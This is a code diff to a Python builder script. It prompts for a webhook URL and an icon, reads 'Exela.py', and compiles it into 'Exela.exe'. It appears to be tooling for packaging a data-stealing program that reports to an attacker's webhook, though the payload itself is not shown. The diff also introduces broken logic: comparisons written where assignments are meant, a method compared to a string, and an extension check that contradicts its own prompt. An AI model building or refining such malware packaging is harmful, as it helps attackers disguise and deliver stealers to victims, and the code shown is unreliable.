@@ -1,17 +1,18 @@
 import os, shutil, time
 
+clearTerm = ""
+
+if os.name == "nt":
+    clearTerm == "cls"
+else:clearTerm == "clear"
+
 webhook = str(input("enter your webhook url : "))
-try:
-    os.system("cls")
-except:
-    try:
-        os.system("clear")
-    except:
-        pass
+os.system(clearTerm)
+
 iconchange = False
 icon = str(input("Yes/no\nDo u want to change icon : "))
 iconpath = ""
-if icon.lower() == "yes" or icon.lower("y"):
+if icon.lower() == "yes" or icon.lower == "y":
     iconchange = True
     iconpath = str(input("icon file must be .ico otherwise the icon will not change\nEnter the path of the icon file : "))
     if not iconpath.endswith(".icon"):
@@ -20,6 +21,7 @@ if icon.lower() == "yes" or icon.lower("y"):
         exit()
 else:
     pass
+
 
 with open("Exela.py", "r", encoding="utf-8", errors="ignore") as sourceCode:
     rip = sourceCode.read()
@@ -65,7 +67,7 @@ def buildFile():
     except:
         pass # sex
   
-    os.system("cls")
+    os.system(clearTerm)
     print("your file build succesfully\nYour file is => Exela.exe")
     time.sleep(2)
     exit()
